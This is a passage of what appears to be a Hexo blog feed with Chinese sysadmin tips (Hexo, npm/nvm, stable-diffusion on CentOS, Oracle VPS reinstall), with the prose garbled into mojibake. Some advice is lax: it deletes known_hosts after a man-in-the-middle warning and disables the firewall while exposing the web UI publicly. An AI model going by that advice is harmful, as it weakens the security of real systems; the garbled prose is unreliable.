comment">#åˆå§‹åŒ–blogï¼Œéœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªåšå®¢ä¸»æ–‡ä»¶å¤¹ï¼Œåœ¨æ–‡ä»¶å¤¹é‡Œæ‰§è¡Œï¼Œæˆ–è€…</span>hexo init blog<span class="token punctuation">(</span>æ–‡ä»¶å¤¹å<span class="token punctuation">)</span> --no-install <span class="token comment">#--no-installæ˜¯é˜»æ­¢é¡¹ç›®å…‹éš†ä¸‹æ¥åï¼Œè‡ªåŠ¨å®‰è£…ä¾èµ–ï¼Œä¸ä½¿ç”¨ä¼šè‡ªåŠ¨å®‰è£…æœ€æ–°ç‰ˆæœ¬hexoï¼Œå…·ä½“è‡ªå·±å½±å“å®æµ‹</span><span class="token function">npm</span> <span class="token function">install</span> hexo@5.4.0 <span class="token comment">#å®‰è£…æƒ³è¦çš„hexoç‰ˆæœ¬ï¼Œæˆ‘çš„è¿™ä¸ªä¸»é¢˜è¿™ä¸ªç‰ˆæœ¬åˆé€‚</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>hexo såä»£ç ä»ç„¶å¼‚å¸¸</p><p>ä¿®æ”¹ä¸»ç›®å½•_config.ymlä¸­çš„ä»£ç ä¸º</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">highlight:  enable: <span class="token boolean">false</span>  line_number: <span class="token boolean">true</span>  auto_detect: <span class="token boolean">false</span>  tab_replace: <span class="token string">''</span>  wrap: <span class="token boolean">true</span>  hljs: <span class="token boolean">false</span>prismjs:  enable: <span class="token boolean">true</span>  preprocess: <span class="token boolean">true</span>  line_number: <span class="token boolean">true</span>  tab_replace: <span class="token string">''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>hexo så†æ¬¡æ‰§è¡Œå¯è§å·²ç»æ­£å¸¸ï¼Œå†å®‰è£…ä»¥å‰å®‰è£…çš„æ’ä»¶</p></li></ul><p>æ³¨ï¼šå› ä¸ºä¸»é¢˜ç‰ˆæœ¬æ›´æ–°ï¼Œæˆ‘ç›´æ¥å…¨åˆ äº†é‡å»ºçš„ï¼Œä¸åˆ ä¿®æ”¹ç‰ˆæœ¬çš„å¯ä»¥å…ˆå¸è½½åŸæ¥çš„ç»„ä»¶å¦‚hexoï¼Œä¸»ç›®å½•ä¸‹çš„_config.ymlæœ‰ç‚¹ä¸åŒï¼Œéœ€è¦è‡ªå·±æ³¨æ„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NPMç®€ä»‹</title>
      <link href="/2024/01/20/npm-jian-jie/"/>
      <url>/2024/01/20/npm-jian-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="NPMç®€ä»‹"><a href="#NPMç®€ä»‹" class="headerlink" title="NPMç®€ä»‹"></a>NPMç®€ä»‹</h1><p>NPMæ˜¯éšåŒNodeJSä¸€èµ·å®‰è£…çš„åŒ…ç®¡ç†å·¥å…·ï¼Œèƒ½è§£å†³NodeJSä»£ç éƒ¨ç½²ä¸Šçš„å¾ˆå¤šé—®é¢˜</p><h2 id="NPMå‘½ä»¤"><a href="#NPMå‘½ä»¤" class="headerlink" title="NPMå‘½ä»¤"></a>NPMå‘½ä»¤</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> æ¨¡å—å <span class="token parameter variable">-g</span>  <span class="token comment">#å…¨å±€å®‰è£…ï¼Œç›¸å½“äºåŠ äº†ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œèƒ½å…¨å±€è°ƒç”¨</span><span class="token function">npm</span> <span class="token function">install</span> æ¨¡å—å <span class="token comment">#æ™®é€šå®‰è£…ï¼Œä¸€èˆ¬å®‰è£…åœ¨å½“å‰æ–‡ä»¶å¤¹</span><span class="token function">npm</span> list <span class="token parameter variable">-g</span> <span class="token comment">#åˆ—å‡ºå·²å®‰è£…å…¨å±€æ¨¡å—</span><span class="token function">npm</span> list<span class="token function">npm</span> list æ¨¡å— <span class="token comment">#æ˜¾ç¤ºæ¨¡å—ç‰ˆæœ¬å·</span><span class="token function">npm</span> uninstall æ¨¡å—å <span class="token parameter variable">-g</span>  <span class="token comment">#å…¨å±€å¸è½½</span><span class="token function">npm</span> uninstall æ¨¡å—å <span class="token comment">#æ™®é€šå¸è½½</span><span class="token function">npm</span> search å…³é”®å­— <span class="token comment">#æœç´¢æ¨¡å—</span><span class="token function">npm</span> view æ¨¡å—å versions  <span class="token comment">#åˆ—å‡ºè¯¥æ¨¡å—æ‰€æœ‰ç‰ˆæœ¬</span><span class="token function">npm</span> <span class="token function">install</span> æ¨¡å—å@ç‰ˆæœ¬å· <span class="token comment">#å®‰è£…å…·ä½“ç‰ˆæœ¬ï¼Œä¸€èˆ¬åªèƒ½å®‰è£…ä¸€ä¸ªç‰ˆæœ¬</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>node.jsç‰ˆæœ¬é—®é¢˜</title>
      <link href="/2024/01/20/node.js-ban-ben-wen-ti/"/>
      <url>/2024/01/20/node.js-ban-ben-wen-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="node-jsç‰ˆæœ¬é—®é¢˜"><a href="#node-jsç‰ˆæœ¬é—®é¢˜" class="headerlink" title="node.jsç‰ˆæœ¬é—®é¢˜"></a>node.jsç‰ˆæœ¬é—®é¢˜</h1><p>èµ·å› æ˜¯æˆ‘æƒ³ç»™node.jsç‰ˆæœ¬é™çº§ï¼Œå¸è½½äº†æ–°ç‰ˆï¼Œå®‰è£…æ—§ç‰ˆåå‘ç°npmä»ç„¶æ˜¯æœ€æ–°ç‰ˆæœ¬</p><h2 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h2><p>å®‰è£…nvm(<a href="https://github.com/coreybutler/nvm-windows">coreybutler/nvm-windows: A node.js version management utility for Windows. Ironically written in Go. (github.com)</a>)ï¼Œè¿™æ˜¯ä¸€æ¬¾ç®¡ç†node.jsç‰ˆæœ¬çš„å·¥å…·</p><h2 id="å®‰è£…æµç¨‹"><a href="#å®‰è£…æµç¨‹" class="headerlink" title="å®‰è£…æµç¨‹"></a>å®‰è£…æµç¨‹</h2><p>è¿›å…¥githubé€‰æ‹©nvm-setupä¸‹è½½ï¼Œç„¶åå‚»ç“œå¼å®‰è£…</p><h2 id="éƒ¨åˆ†å‘½ä»¤"><a href="#éƒ¨åˆ†å‘½ä»¤" class="headerlink" title="éƒ¨åˆ†å‘½ä»¤"></a>éƒ¨åˆ†å‘½ä»¤</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nvm  <span class="token comment">#æŸ¥çœ‹å‘½ä»¤é¢æ¿</span>nvm <span class="token function">ls</span> available <span class="token comment">#åˆ—å‡ºå¯ç”¨çš„æœ€æ–°çš„éƒ¨åˆ†node.jsç‰ˆæœ¬</span>nvm <span class="token function">install</span> ç‰ˆæœ¬å· <span class="token comment"># å®‰è£…æƒ³è¦çš„ç‰ˆæœ¬</span>nvm uninstall ç‰ˆæœ¬å· <span class="token comment"># å¸è½½æƒ³è¦çš„ç‰ˆæœ¬</span>nvm list <span class="token comment">#åˆ—å‡ºå·²ç»å®‰è£…çš„ç‰ˆæœ¬</span>nvm use ç‰ˆæœ¬å· <span class="token comment">#å¯ç”¨ç‰ˆæœ¬</span><span class="token function">node</span> <span class="token parameter variable">-v</span> <span class="token comment">#æŸ¥çœ‹ç‰ˆæœ¬å·</span><span class="token function">npm</span> <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexoå‡çº§åŠå‡çº§åçš„é—®é¢˜</title>
      <link href="/2024/01/14/hexo-sheng-ji/"/>
      <url>/2024/01/14/hexo-sheng-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="hexoå‡çº§åŠå‡çº§åçš„é—®é¢˜"><a href="#hexoå‡çº§åŠå‡çº§åçš„é—®é¢˜" class="headerlink" title="hexoå‡çº§åŠå‡çº§åçš„é—®é¢˜"></a>hexoå‡çº§åŠå‡çº§åçš„é—®é¢˜</h1><h2 id="hexoå‡çº§"><a href="#hexoå‡çº§" class="headerlink" title="hexoå‡çº§"></a>hexoå‡çº§</h2><p>é¦–å…ˆå‡çº§node.jsï¼Œå»å®˜ç½‘ä¸‹è½½æœ€æ–°å®‰è£…åŒ…ï¼Œæ¥ç€æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å‡çº§hexo</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> <span class="token parameter variable">-g</span> npm-check-updates <span class="token comment"># å®‰è£…æ›´æ–°å·¥å…·</span>ncu <span class="token comment"># æ£€æŸ¥npmè½¯ä»¶åŒ…æ›´æ–°ï¼Œéœ€åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹æ‰§è¡Œ</span>ncu <span class="token parameter variable">-u</span> <span class="token comment"># æ›´æ–°package.jsoné…ç½®</span><span class="token function">npm</span> <span class="token function">install</span> <span class="token comment"># å®‰è£…package.jsoné…ç½®çš„ç‰ˆæœ¬</span>hexo version <span class="token comment"># æ›´æ–°åæ£€æŸ¥hexoç‰ˆæœ¬</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å‡çº§åçš„é—®é¢˜"><a href="#å‡çº§åçš„é—®é¢˜" class="headerlink" title="å‡çº§åçš„é—®é¢˜"></a>å‡çº§åçš„é—®é¢˜</h2><p>å‡çº§åæ‰§è¡Œhexo déƒ¨ç½²æäº¤æ—¶æŠ¥é”™</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">at ChildProcess.<span class="token operator">&lt;</span>anonymous<span class="token operator">&gt;</span> <span class="token punctuation">(</span>D:<span class="token punctuation">\</span>blog<span class="token punctuation">\</span>node_modules<span class="token punctuation">\</span>_hexo-util@1.9.0@hexo-util<span class="token punctuation">\</span>lib<span class="token punctuation">\</span>spawn.js:51:21<span class="token punctuation">)</span>    at ChildProcess.emit <span class="token punctuation">(</span>events.js:310:20<span class="token punctuation">)</span>    at ChildProcess.cp.emit <span class="token punctuation">(</span>D:<span class="token punctuation">\</span>blog<span class="token punctuation">\</span>node_modules<span class="token punctuation">\</span>_cross-spawn@7.0.2@cross-spawn<span class="token punctuation">\</span>lib<span class="token punctuation">\</span>enoent.js:34:29<span class="token punctuation">)</span>    at Process.ChildProcess._handle.onexit <span class="token punctuation">(</span>internal/child_process.js:275:12<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ—¶å€™ä½ éœ€è¦æ‰§è¡Œ<code>ssh -T git@github.com</code>æµ‹è¯•æ˜¯å¦è¿æ¥æ­£å¸¸ï¼Œè‹¥å¤±è´¥æŠ¥é”™</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED<span class="token operator">!</span>     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY<span class="token operator">!</span> Someone could beeavesdropping on you right now <span class="token punctuation">(</span>man-in-the-middle attack<span class="token punctuation">)</span><span class="token operator">!</span> It is alsopossible that a <span class="token function">host</span> key has just been changed. The fingerprint <span class="token keyword">for</span> the RSAkey sent by the remote <span class="token function">host</span> is <span class="token punctuation">[</span>truncated<span class="token punctuation">]</span>. Please contact your systemadministrator. Add correct <span class="token function">host</span> key <span class="token keyword">in</span> /home/username/.ssh/known_hosts toget rid of this message. Offending RSA key <span class="token keyword">in</span>/home/username/.ssh/known_hosts:24 Password authentication is disabled toavoid man-in-the-middle attacks. Keyboard-interactive authentication isdisabled to avoid man-in-the-middle attacks. Agent forwarding is disabled toavoid man-in-the-middle attacks.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ™å…ˆå»githubé‡æ–°ç»‘å®šç§˜é’¥ï¼ˆå¦‚æœåŸæ¥çš„æ‰äº†ï¼‰ï¼Œæ­¥éª¤å’Œå®‰è£…æ˜¯ä¸€æ ·ï¼Œç„¶åå»<code>c/Users/youuser/.ssh</code>ä¸‹åˆ é™¤<code>c:\users\username\.ssh\known_hosts</code>è¿™ä¸ªæ–‡ä»¶ï¼Œé‡æ–°æ‰§è¡Œ<code>ssh -T git@github.com</code>ï¼Œé€‰æ‹©yesï¼Œè¿æ¥æˆåŠŸï¼Œå†è¿›è¡Œhexo dæäº¤ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stable-diffusionéƒ¨ç½²åœ¨centos</title>
      <link href="/2023/05/15/stable-diffusion-bu-shu-zai-ubuntu/"/>
      <url>/2023/05/15/stable-diffusion-bu-shu-zai-ubuntu/</url>
      
        <content type="html"><![CDATA[<h1 id="stable-diffusionéƒ¨ç½²åœ¨centos"><a href="#stable-diffusionéƒ¨ç½²åœ¨centos" class="headerlink" title="stable-diffusionéƒ¨ç½²åœ¨centos"></a>stable-diffusionéƒ¨ç½²åœ¨centos</h1><h2 id="å®‰è£…pythonç¯å¢ƒ"><a href="#å®‰è£…pythonç¯å¢ƒ" class="headerlink" title="å®‰è£…pythonç¯å¢ƒ"></a>å®‰è£…pythonç¯å¢ƒ</h2><p>ç‰ˆæœ¬æ¨èpython3.10.6</p><h2 id="å®‰è£…git"><a href="#å®‰è£…git" class="headerlink" title="å®‰è£…git"></a>å®‰è£…git</h2><p>sudo apt install git </p><h2 id="å¼€å§‹éƒ¨ç½²"><a href="#å¼€å§‹éƒ¨ç½²" class="headerlink" title="å¼€å§‹éƒ¨ç½²"></a>å¼€å§‹éƒ¨ç½²</h2><p>åˆ°æ™®é€šç”¨æˆ·ç›®å½•æ‰§è¡Œ<code>git clone https://github.com/AUTOMATIC1111/stable-diffusion-webui.git</code>æŠŠé¡¹ç›®ä¸‹è½½</p><p>æ‰§è¡Œ./webui.shä¸‹è½½ä¾èµ–æœ€åå¯åŠ¨</p><h2 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><p>å…ˆå®‰è£…pytorch</p><p>launch.py</p><pre class="line-numbers language-none"><code class="language-none">æ‰¾åˆ°torch_command = os.environ.get('TORCH_COMMAND', "pip install torch==1.13.1+cu117 torchvision==0.14.1+cu117 --extra-index-url https://download.pytorch.org/whl/cu117")ï¼Œå¹¶ä¿®æ”¹ä¿®æ”¹åï¼štorch_command = os.environ.get('TORCH_COMMAND', "pip install torch==1.13.1 torchvision==0.14.1") <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">ln <span class="token operator">-</span>s <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>bin<span class="token operator">/</span>python3 <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>pythonln <span class="token operator">-</span>s <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>bin<span class="token operator">/</span>pip3 <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>pip<span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token constant">AUTOMATIC1111</span><span class="token operator">/</span>stable<span class="token operator">-</span>diffusion<span class="token operator">-</span>webui<span class="token punctuation">.</span>git<span class="token constant">COMMANDLINE_ARGS</span><span class="token operator">=</span><span class="token operator">--</span>skip<span class="token operator">-</span>torch<span class="token operator">-</span>cuda<span class="token operator">-</span>test <span class="token operator">--</span>precision full <span class="token operator">--</span>no<span class="token operator">-</span>half <span class="token operator">--</span>lowvram<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>weibu.pyä¸­å°†shared.demo.launch()ç¬¬ä¸€è¡Œ</p><p>æ”¹ä¸ºshare=True</p><pre class="line-numbers language-none"><code class="language-none">pip install -r requirements.txtpip install -r requirements_versions.txtpip install basicsrpip install facexlibpip install -r requirements.txtpython setup.py develop# If you want to enhance the background (non-face) regions with Real-ESRGAN,# you also need to install the realesrgan packagepip install realesrgan--skip-torch-cuda-test --upcast-sampling --use-cpu interrogate./webui.sh --listen --no-half<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">add-apt-repository ppa:deadsnakes/ppaapt updateapt install python3.10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Failed to build these modules: _ctypesyum install libffi-devel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">$ ./configure --prefix=/usr/local/python3 --enable-optimizations$ make$ make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">yum install -y xz-develpip install backports.lzmayum install mesa-libGL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">/home/hero/stable-diffusion-webui/venv/bin/python3 -m pip install --upgrade torchvision==0.2.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">systemctl status firewalldsystemctl stop firewalldyum install -y iptables-servicessystemctl start iptablessystemctl status iptablescp -a /etc/sysconfig/iptables /etc/sysconfig/iptables.bakiptables -I INPUT -p tcp --dport 7860 -m state --state NEW -j ACCEPTiptables-save &gt; /etc/sysconfig/iptablessystemctl enable iptables.servicesystemctl enable iptables.servicesystemctl rebootnetstat -tulpeniptables -Liptables -A INPUT -p tcp --dport 7860 -j ACCEPTiptables -A OUTPUT -p tcp --sport 7860 -j ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">~/stable-diffusion-webui/webui.sh --listen<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">vi /etc/sysconfig/iptables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythonè°ƒç”¨datetime.now()æç¤ºæœªæ‰¾åˆ°æ¨¡å—</title>
      <link href="/2023/03/23/python-diao-yong-datetime.now-ti-shi-wei-zhao-dao-mo-kuai/"/>
      <url>/2023/03/23/python-diao-yong-datetime.now-ti-shi-wei-zhao-dao-mo-kuai/</url>
      
        <content type="html"><![CDATA[<h1 id="pythonè°ƒç”¨datetime-now-æç¤ºæœªæ‰¾åˆ°æ¨¡å—"><a href="#pythonè°ƒç”¨datetime-now-æç¤ºæœªæ‰¾åˆ°æ¨¡å—" class="headerlink" title="pythonè°ƒç”¨datetime.now()æç¤ºæœªæ‰¾åˆ°æ¨¡å—"></a>pythonè°ƒç”¨datetime.now()æç¤ºæœªæ‰¾åˆ°æ¨¡å—</h1><p>é¦–å…ˆç¡®å®šå¯¼å…¥äº†æ¨¡å—<code>from datetime import datetime</code></p><p>å¦‚æœè¿˜æ˜¯æŠ¥é”™ï¼Œé‚£ä¹ˆå¯èƒ½å­˜åœ¨ä¸€ä¸ª<code>datetime.py</code>çš„æ–‡ä»¶è¦†ç›–äº†åŸæ¨¡å—</p><p>å¯ä»¥ç›´æ¥ä½¿ç”¨<code>datetime.datetime.now()</code>æ¥è°ƒç”¨ï¼Œæˆ–è€…å°†é‚£ä¸ª<code>datetime.py</code>æ”¹å</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç”²éª¨æ–‡äº‘é‡ç½®å®ä¾‹</title>
      <link href="/2023/03/23/jia-gu-wen-yun-chong-zhi-shi-li/"/>
      <url>/2023/03/23/jia-gu-wen-yun-chong-zhi-shi-li/</url>
      
        <content type="html"><![CDATA[<h1 id="ç”²éª¨æ–‡äº‘é‡ç½®å®ä¾‹"><a href="#ç”²éª¨æ–‡äº‘é‡ç½®å®ä¾‹" class="headerlink" title="ç”²éª¨æ–‡äº‘é‡ç½®å®ä¾‹"></a>ç”²éª¨æ–‡äº‘é‡ç½®å®ä¾‹</h1><p>æ¥è‡ª<a href="https://v2rayssr.com/oracle-centos.html">https://v2rayssr.com/oracle-centos.html</a></p><h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><p>1ã€ç”²éª¨æ–‡ï¼ˆoracleï¼‰æœºå™¨ä¸€å°ï¼ˆå§‹ç»ˆå…è´¹ï¼‰ï¼Œè‹¥æ˜¯æ²¡æœ‰ï¼Œè¯·çœ‹ä¸‹é¢åšæ–‡é“¾æ¥ï¼š</p><ul><li><a href="https://v2rayssr.com/oracle.html">å§‹ç»ˆå…è´¹çš„VPSï¼æ²¹ç®¡8Kè§†é¢‘ç§’å¼€ï¼Œé¢ è¦†ä½ å¯¹å…è´¹èµ„æºçš„çœ‹æ³•ã€‚Oracleï¼ˆç”²éª¨æ–‡ï¼‰å…è´¹äº‘æœåŠ¡å™¨æ³¨å†ŒæŒ‡å—åŠæ•…éšœè§£å†³ï¼</a></li><li><a href="https://v2rayssr.com/oracle-arm.html">å§‹ç»ˆå…è´¹çš„ 4æ ¸ 24Gå†…å­˜ çš„VPSï¼ç”²éª¨æ–‡ (oracle) æŠ¢/åˆ· ARM å®ä¾‹ï¼ä¸€é”®è„šæœ¬éƒ¨ç½²å¼€ARMæœºå™¨ï¼</a></li></ul><p>2ã€SSH è¿æ¥å·¥å…·ï¼ˆ<a href="https://v2rayssr.com/go?url=https://www.hostbuf.com/t/988.html">FinalShell</a>ï¼‰ï¼ŒVNC è¿æ¥å·¥å…·ï¼ˆ<a href="https://v2rayssr.com/go?url=https://www.realvnc.com/en/connect/download/viewer/">VNCÂ® Viewer</a>ï¼‰</p><p>3ã€åŸŸåä¸€ä¸ªåšå¥½è§£æï¼Œå¼€å¯ CDNï¼ˆå°äº‘æœµï¼‰ï¼Œæ¯•ç«Ÿæ˜¯å»ºç«™çš„</p><h2 id="è§†é¢‘æ•™ç¨‹æ¼”ç¤º"><a href="#è§†é¢‘æ•™ç¨‹æ¼”ç¤º" class="headerlink" title="è§†é¢‘æ•™ç¨‹æ¼”ç¤º"></a>è§†é¢‘æ•™ç¨‹æ¼”ç¤º</h2><p><a href="https://v2rayssr.com/go?url=https://youtu.be/grebA_WHGXY"><img src="https://v2rayssr.com/wp-content/uploads/2022/07/12232323.png" alt="img"></a></p><h2 id="ç”²éª¨æ–‡-VPS-å®‰è£…-CentOS-8"><a href="#ç”²éª¨æ–‡-VPS-å®‰è£…-CentOS-8" class="headerlink" title="ç”²éª¨æ–‡ VPS å®‰è£… CentOS 8"></a>ç”²éª¨æ–‡ VPS å®‰è£… CentOS 8</h2><blockquote><p><strong>å‹æƒ…æç¤ºï¼š</strong></p><p>ä¸‹é¢ä¸º ARM æœºå™¨å®‰è£…æ¼”ç¤º</p></blockquote><h3 id="VPS-è®¾ç½®"><a href="#VPS-è®¾ç½®" class="headerlink" title="VPS è®¾ç½®"></a>VPS è®¾ç½®</h3><p>SSH è¿æ¥ VPSï¼Œå¹¶è¿›å…¥ boot æ–‡ä»¶å¤¹ï¼Œä¸‹è½½ Netboot å¯åŠ¨æ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">apt update -yapt install wget -ycd /boot/efi/EFIwget https://boot.netboot.xyz/ipxe/netboot.xyz-arm64.efi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è‹¥ä½ æ˜¯é‡è£…ç³»ç»Ÿï¼Œè¯·æ‰§è¡Œä¸‹é¢å‘½ä»¤</p><pre class="line-numbers language-none"><code class="language-none">yum update -yyum install wget -ycd /boot/efi/EFIwget https://boot.netboot.xyz/ipxe/netboot.xyz-arm64.efi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ç”²éª¨æ–‡æ§åˆ¶å°è®¾ç½®"><a href="#ç”²éª¨æ–‡æ§åˆ¶å°è®¾ç½®" class="headerlink" title="ç”²éª¨æ–‡æ§åˆ¶å°è®¾ç½®"></a>ç”²éª¨æ–‡æ§åˆ¶å°è®¾ç½®</h3><p>è¿›å…¥ç”²éª¨æ–‡æ§åˆ¶å°ï¼Œç‚¹å‡»å®ä¾‹è¯¦æƒ…ï¼Œåœ¨å·¦è¾¹æ‰¾åˆ° â€œæ§åˆ¶å°è¿æ¥â€ ï¼Œå¯åŠ¨ Cloud Shell è¿æ¥</p><h3 id="è®¾ç½®-Netboot-å¼•å¯¼å¯åŠ¨"><a href="#è®¾ç½®-Netboot-å¼•å¯¼å¯åŠ¨" class="headerlink" title="è®¾ç½® Netboot å¼•å¯¼å¯åŠ¨"></a>è®¾ç½® Netboot å¼•å¯¼å¯åŠ¨</h3><p>é‡å¯ VPS ï¼Œå¹¶åœ¨ Cloud Shell é‡Œé¢ä¸åœæŒ‰é”®ç›˜ ESC é”®ï¼Œè¿›å…¥ BIOS ï¼Œå¦‚å›¾æ‰€ç¤º</p><p><img src="https://v2rayssr.com/wp-content/uploads/2022/06/112.jpg" alt="img"></p><p>é€‰æ‹© Boot Maintenance Manager â€”â€” Boot Frome File ï¼Œ</p><p><img src="https://v2rayssr.com/wp-content/uploads/2022/06/133.jpg" alt="img"></p><p>é€‰æ‹© <code>netboot.xyz-arm64.efi</code>ï¼Œç‚¹å‡»å›è½¦ï¼Œè¿›è¡Œå¼•å¯¼ï¼</p><p><img src="https://v2rayssr.com/wp-content/uploads/2022/06/1233.jpg" alt="img"></p><p>åœ¨å¼•å¯¼çš„ç•Œé¢ï¼Œæˆ‘ä»¬é€‰æ‹© <code>Linux Network Installs (arm64)</code></p><p><img src="https://v2rayssr.com/wp-content/uploads/2022/06/1212.jpg" alt="img"></p><p>é€‰æ‹©ä½ éœ€è¦å®‰è£…çš„ç³»ç»Ÿï¼Œé€‰æ‹©é”™è¯¯ï¼Œå¯ä»¥æŒ‰ ESC è¿”å›ä¸Šçº§èœå•ï¼Œæˆ‘ä»¬é€‰æ‹© <code>CentOS</code> â€”â€” <code>CentOS 8.0 Stream</code>ï¼Œç‚¹å‡»å›è½¦ï¼Œå†æ¬¡é€‰æ‹© <code>CentOS 8-stream text based installer</code></p><p><img src="https://v2rayssr.com/wp-content/uploads/2022/06/2323.jpg" alt="img"></p><p>å¼€å§‹å¼•å¯¼å®‰è£…äº†ä»¥åï¼Œæˆ‘ä»¬åœ¨ Cloud Shell é‡Œé¢ä¼šçœ‹åˆ°å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://v2rayssr.com/wp-content/uploads/2022/06/232323.jpg" alt="img"></p><p>æˆ‘ä»¬é€‰æ‹© 1ï¼Œä½¿ç”¨ VNC å¯è§†åŒ–è¿›è¡Œå®‰è£…</p><p>è®¾ç½® VNC çš„å¯†ç ï¼ˆä¸€å®šåªæ˜¯6 â€“ 8ä¸ªå­—ç¬¦ï¼‰ï¼Œç¡®è®¤å¯†ç </p><h3 id="VNC-è¿æ¥-VPS"><a href="#VNC-è¿æ¥-VPS" class="headerlink" title="VNC è¿æ¥ VPS"></a>VNC è¿æ¥ VPS</h3><p>ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ VNC å·¥å…·æ¥è¿æ¥æˆ‘ä»¬çš„ç”²éª¨æ–‡ ARM æœºå™¨ï¼Œå¹¶è¿›è¡Œå®‰è£…äº†ã€‚</p><p>VNCÂ® Viewer è½¯ä»¶è¿æ¥åœ°å€ï¼š<code>VPSIP:1</code> ï¼Œè¾“å…¥å¯†ç ä»¥åï¼Œä½ å¤§è‡´å°±è¿æ¥æˆåŠŸäº†</p><h3 